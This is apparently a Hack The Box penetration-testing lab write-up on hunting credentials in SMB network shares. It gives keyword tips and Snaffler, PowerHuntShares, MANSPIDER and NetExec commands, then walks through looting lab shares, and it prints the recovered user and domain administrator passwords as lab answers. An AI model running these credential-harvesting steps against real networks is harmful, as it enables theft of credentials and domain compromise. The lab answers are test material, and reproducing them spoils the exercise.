### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Credential Hunting in Network Shares <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Credential Hunting in Network Shares



Corporate network shares often contain plaintext creds, config files, scripts, password DBs.

#### Hunting tips

- Keywords: `passw`, `user`, `token`, `key`, `secret`, `INLANEFREIGHT\` (or org-specific)
- Filetypes: `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, `.bat`
- Filenames containing: `config`, `user`, `passw`, `cred`, `initial`
- Localize the keywords to target language (e.g. German `Benutzer`)
- Prioritize IT-team shares over photo / generic shares

#### Hunting from Windows

[Snaffler](https://github.com/SnaffCon/Snaffler) — domain-joined, automatically finds + scans interesting files:

```diff
+ C:\Users\Public>Snaffler.exe -s
```

<br>

Useful flags: `-u` (cross-reference AD users in matches), `-i`/`-n` (include/exclude shares).

[PowerHuntShares](https://github.com/NetSPI/PowerHuntShares) — PowerShell, generates HTML report:

```diff
+ PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

<br>

#### Hunting from Linux

[MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) — Docker-friendly remote SMB content scanner:

```diff
+ $ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <target> -c 'passw' -u '<user>' -p '<pass>'
```

<br>

NetExec — `--spider` option for content searches:

```diff
+ $ nxc smb <target> -u <user> -p '<pass>' --spider IT --content --pattern "passw"
```

<br>

NetExec spider_plus module — also downloads matching files for offline review:

```diff
+ $ nxc smb <target> -u <user> -p '<pass>' -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```

<br>

---

<br>

### Exercise

IP: 10.129.154.247 — RDP/WinRM as `mendres:Inlanefreight2025!`. `Snaffler` and `PowerHuntShares` are pre-staged in `C:\Users\Public`.

---

### Question 1:
One of the shares mendres has access to contains valid credentials of another domain user. What is their password?

NetExec spider_plus from the attack box (auto-downloads readable files):

```diff
+ $ nxc smb 10.129.154.247 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```

	Share           Permissions
	Company         READ
	HR              READ
	IT              READ

<br>

Recursively grep for the keyword `INLANEFREIGHT`:

```diff
+ $ cd /tmp/nxc_hosted/nxc_spider_plus/
+ $ grep -ir "INLANEFREIGHT" .
```

	./IT/Tools/split_tunnel.txt:# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###

&#x1F6A9; found **ILovePower--edit--333###**.

---

### Question 2:
As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?

Re-run spider_plus as jbader (gets access to additional shares):

```diff
+ $ nxc smb 10.129.154.247 -u jbader -p ILovePower333### -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```

<br>

Grep recursively (case-insensitive) for `domain`:

```diff
+ $ grep -ir "domain" .
```

	./HR/Confidential/Onboarding_Docs_132.txt:[✔] Domain Admin Rights Applied

<br>

Read the onboarding doc:

```diff
+ $ cat ./HR/Confidential/Onboarding_Docs_132.txt
```

	**Username:** `Administrator`
	**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`

&#x1F6A9; found **Str0ng_Adm1nistrat--edit--0r_P@ssword_2025!**.
